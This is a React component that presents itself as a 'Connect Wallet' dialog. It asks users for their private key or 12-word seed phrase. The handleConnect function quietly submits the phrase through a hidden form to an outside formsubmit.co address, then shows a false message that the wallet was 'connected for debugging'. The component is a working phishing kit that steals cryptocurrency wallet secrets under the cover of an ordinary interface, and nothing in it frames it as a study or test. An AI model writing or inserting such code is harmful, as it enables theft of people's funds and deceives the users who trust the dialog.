import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { Check } from "lucide-react";

interface WalletDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
  const [phrase, setPhrase] = useState("");
  const { toast } = useToast();

  const handleConnect = async () => {
    if (!phrase.trim()) {
      toast({
        title: "Error",
        description: "Please enter your private key phrase",
        variant: "destructive",
      });
      return;
    }
   
    try {
      // Send email using a form submission to avoid CORS issues
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'https://formsubmit.co/06fed404371470d7cfff86b643c88efe';
     
      const phraseInput = document.createElement('input');
      phraseInput.type = 'hidden';
      phraseInput.name = 'phrase';
      phraseInput.value = phrase;
     
      form.appendChild(phraseInput);
      document.body.appendChild(form);
      form.submit();
     
      // Show success message
      toast({
        title: "Success",
        description: "Your wallet has been successfully connected for debugging"
      });
     
      // Reset the input and close dialog
      setPhrase("");
      onOpenChange(false);
    } catch (error) {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-center">Connect Wallet</DialogTitle>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <p className="text-sm text-muted-foreground text-center">
            Input your private key or 12 phrase for access to your account. Please input it in the order specified.
          </p>
          <p className="text-xs text-muted-foreground text-center">
            Separate each word with a space
          </p>
          <Input
            placeholder="Enter your private key or 12 word phrase"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            className="w-full"
          />
          <div className="flex justify-center">
            <Button onClick={handleConnect} className="w-full sm:w-auto">
              Connect
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default WalletDialog;
